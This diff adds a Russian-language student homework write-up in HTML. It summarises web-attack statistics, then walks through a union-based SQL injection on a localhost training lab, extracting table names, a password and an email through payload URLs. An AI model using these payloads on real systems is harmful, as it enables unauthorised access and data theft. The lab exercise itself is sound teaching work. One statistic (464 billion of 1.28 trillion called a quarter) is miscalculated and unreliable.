@@ -1,0 +1,161 @@
+<head>
+    <meta charset="UTF-8">
+</head>
+<h1>1 Задание</h1>
+<p>По данным исследования компании Versaca (<a
+        href="https://vercara.digicert.com/resources/vercara-waf-analysis-report-november-2025">https://vercara.digicert.com/resources/vercara-waf-analysis-report-november-2025</a>)
+    за ноябрь 2025 года из 1.28 триллиона обработанных веб запросов системой UltraWAF (фаервол), вредоносными из них
+    были 464 миллиарда, что составляет четверть от всех запросов.
+    Большая часть из этих запросов была связана с куки-файлами (около 55 %).
+    Больше всего атакам подвергались сайты для путешествий (81%), сайты связанные с финансами(16%), технологические и
+    связанные с безопасностью (1%)</p>
+<p>Пути атак</p>
+<ol>
+    <li>Cookie-based атаки (54.84%)</li>
+    <li>Command Injection (21.00%) (команды для ОС)</li>
+    <li>Field Format violations (10.12%)</li>
+</ol>
+<hr>
+<p>Исследование центра Solar 4rays (<a
+        href="https://www.comnews.ru/content/243602/2026-02-03/2026-w06/1008/veb-prilozheniya-stali-bolee-uyazvimymi">https://www.comnews.ru/content/243602/2026-02-03/2026-w06/1008/veb-prilozheniya-stali-bolee-uyazvimymi</a>)
+    (февраль 2026)</p>
+<p>В РФ 2025 сильный рост количества уязвимостей в веб-приложениях (3.2 раза). Большиноство из них связано с
+    использованием стороннего ПО, сайтов написанных с помощью WordPress (как и говорилось на лекции) и сервисов
+    написанных с ИИ.</p>
+<hr>
+<p>По исследованию COCognito от сентября 2025 (<a
+        href="https://www.scworld.com/news/more-than-half-of-internet-exposed-assets-have-no-web-application-firewall">https://www.scworld.com/news/more-than-half-of-internet-exposed-assets-have-no-web-application-firewall</a>)
+    проблема инфобеза приложений не только в наличии вышеперечисленных уязвимостей, но и в отсутсвии защиты.
+    Исследование говорит, что более 50% облачных активов не имеет фаерволов, из них 40% собиррают персональные данные. У
+    необлачных сервисов 67% не имеют фаервол, практически все их них используют персональные данные. </p>
+<h1>2 Задание</h1>
+<p>Не вижу поля ввода куда айдишник вводить (хз так и должно быть или не хд попробуем через линк)</p>
+<p>Попробовал ввести <a href="http://localhost:8080/task/1">http://localhost:8080/task/1</a>
+    Not Found</p>
+<p>The requested URL /task/1 was not found on this server.</p>
+<p>Странички нема такой попробуем как sql запрос сделать </p>
+<p><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a></p>
+<p><img src="image.png" alt="alt text"></p>
+<p>победа значит тут у нас возможно будет уязвимость скл инъекции (удивительно)</p>
+<p>Попробуем </p>
+<p>localhost:8080/task/?id=1&#39;</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right
+    syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</p>
+<p>В этом поле и правда просто передается часть скл запроса, + в конце у нас есть id = &#39;1&#39; limit 0, 1</p>
+<p>я понял что запрос выглядит как то так
+    id=&#39;поле из линка&#39; limit 0,1 , можно встаить самому &#39; дописать свой запрос и все что после просто
+    закоментить, попробуем </p>
+<p><a href="http://localhost:8080/task/?id=1%27+and+1=1+--+">http://localhost:8080/task/?id=1%27+and+1=1+--+</a></p>
+<p>Работает, значит теперь вместо and 1=1 мы можем дописать свою инъекцию </p>
+<p>Для union нам нужно знать сколько колонок в таблице, с помощью order by можем определить </p>
+<p><a href="http://localhost:8080/task/?id=1%27+order+by+1+--+">http://localhost:8080/task/?id=1%27+order+by+1+--+</a>
+</p>
+<p><a href="http://localhost:8080/task/?id=1%27+order+by+4+--+">http://localhost:8080/task/?id=1%27+order+by+4+--+</a> -
+    получили ошибку Unknown column &#39;4&#39; in &#39;order clause&#39;, значит колонок в таблице у нас 3 (видимо айди,
+    имя и пароль)</p>
+<p>Надо понять какое имя у таблицы, для этого хорошо бы было знать какая субд используется (не зная про докер :D )</p>
+<p>Можем проверить командой версии </p>
+<p><a
+        href="http://localhost:8080/task/?id=1%27+union+select+version()+--+">http://localhost:8080/task/?id=1%27+union+select+version()+--+</a>
+</p>
+<p>The used SELECT statements have a different number of columns</p>
+<p>колонок же 3 возвращается</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+2,+@@version+--+">http://localhost:8080/task/?id=-1%27+union+select+1,+2,+@@version+--+</a>
+    Ваш id:1
+    Ваш логин:2</p>
+<p>Подменяем айди на несуществующий, и теперь видим первые 2 резульата второго селекта, поменяем версию и 2 местами </p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+version()+,+2--+">http://localhost:8080/task/?id=-1%27+union+select+1,+version()+,+2--+</a>
+</p>
+<p>Ваш id:1
+    Ваш логин:5.7.44</p>
+<p>Значит либо постгря либо mysql, у постгри длинный ответ на это сообщение, а у mysql короткий, значит субд - mysql</p>
+<p>тепреь узнаем имя нашей бд (для mysql - select database() )</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+database()+,+2--+">http://localhost:8080/task/?id=-1%27+union+select+1,+database()+,+2--+</a>
+</p>
+<p>Ваш id:1
+    Ваш логин:security</p>
+<p>имя бд есть, знаем количество колонок, и какие нам будут видны, остается узнать какие таблицы у нас есть в этой бд
+</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_name=%27security%27+--+">http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_name=%27security%27+--+</a>
+</p>
+<p>просто белый экран (я забыл что там еще табилцу надо найти и хотел сразу колонки смотреть в табилце security)</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+--+">http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+--+</a>
+</p>
+<p>Ваш id:1
+    Ваш логин:emails</p>
+<p>есть таблица с почтами
+    нужно еще другие, поиграемся с лимитами </p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+limit+0,1+--+">http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+limit+0,1+--+</a>
+</p>
+<p>Ваш id:1
+    Ваш логин:emails</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+limit+1,1+--+">http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+limit+1,1+--+</a>
+</p>
+<p>Ваш id:1
+    Ваш логин:users</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+limit+2,1+--+">http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+limit+2,1+--+</a>
+</p>
+<p>белый экран, значит у нас две таблички, почты и юзеры, узнаем какие поля у таблицы юзеров</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27users%27++--+">http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27users%27++--+</a>
+</p>
+<p>Ваш id:1
+    Ваш логин:id</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27users%27+limit+1,1++--+">http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27users%27+limit+1,1++--+</a>
+</p>
+<p>Ваш id:1
+    Ваш логин:username</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27users%27+limit+2,1++--+">http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27users%27+limit+2,1++--+</a>
+</p>
+<p>Ваш id:1
+    Ваш логин:password</p>
+<p>Теперь мы знаем имя бд, таблицы и все нужные нам поля. Просим табилцу users отнимать от 1000 по 7 и делаем финальный
+    удар</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+username,+password,3+from+users+where+username=%27Volk2%27+--+">http://localhost:8080/task/?id=-1%27+union+select+username,+password,3+from+users+where+username=%27Volk2%27+--+</a>
+</p>
+<p>Ваш id:Volk2
+    Ваш логин:Wa spoiuuuuu</p>
+<p>-&gt;??? 1000-7 absolute </p>
+<p>посмотрим в таблицу с почтами</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27emails%27+limit+0,1++--+">http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27emails%27+limit+0,1++--+</a>
+</p>
+<p>Ваш id:1
+    Ваш логин:id</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27emails%27+limit+1,1++--+">http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27emails%27+limit+1,1++--+</a>
+</p>
+<p>Ваш id:1
+    Ваш логин:email_id</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27emails%27+limit+2,1++--+">http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27emails%27+limit+2,1++--+</a>
+</p>
+<p>белый экран</p>
+<p>надо узнать айди человечка с именем Vinni-pukh и далее пробить его в таблице с почтами </p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+username,+id,3+from+users+where+username=%27Vinni-pukh%27+--+">http://localhost:8080/task/?id=-1%27+union+select+username,+id,3+from+users+where+username=%27Vinni-pukh%27+--+</a>
+</p>
+<p>Ваш id:Vinni-pukh
+    Ваш логин:4</p>
+<p><a
+        href="http://localhost:8080/task/?id=-1%27+union+select+id,+email_id,3+from+emails+where+id=%274%27+--+">http://localhost:8080/task/?id=-1%27+union+select+id,+email_id,3+from+emails+where+id=%274%27+--+</a>
+</p>
+<p>Ваш id:4
+    Ваш логин:<a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></p>
+<h1>RESULT</h1>
+<p>Volk2
+    Wa spoiuuuuu</p>
+<p>Vinni-pukh
+    <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a>
+</p>
